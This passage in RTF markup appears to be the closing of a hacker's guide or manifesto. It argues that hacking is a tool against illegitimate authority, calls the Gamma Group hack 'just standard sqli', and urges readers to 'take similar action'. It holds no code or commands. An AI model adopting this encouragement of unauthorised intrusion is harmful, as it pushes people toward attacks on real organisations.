\par\plain {\f1\fs24\b0\i0 customers are targeting and with what purpose that makes them evil. That's not}
\par\plain {\f1\fs24\b0\i0 to say that tools are inherently neutral. Hacking is an offensive tool. In the}
\par\plain {\f1\fs24\b0\i0 same way that guerrilla warfare makes it harder to occupy a country, whenever}
\par\plain {\f1\fs24\b0\i0 it's cheaper to attack than to defend it's harder to maintain illegitimate}
\par\plain {\f1\fs24\b0\i0 authority and inequality. So I wrote this to try to make hacking easier and more}
\par\plain {\f1\fs24\b0\i0 accessible. And I wanted to show that the Gamma Group hack really was nothing}
\par\plain {\f1\fs24\b0\i0 fancy, just standard sqli, and that you do have the ability to go out and take}
\par\plain {\f1\fs24\b0\i0 similar action.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Solidarity to everyone in Gaza, Israeli conscientious-objectors, Chelsea}
\par\plain {\f1\fs24\b0\i0 Manning, Jeremy Hammond, Peter Sunde, anakata, and all other imprisoned}
\par\pard\plain \keep\sa240\ltrch\loch {\f1\fs24\b0\i0 hackers, dissidents, and criminals!}}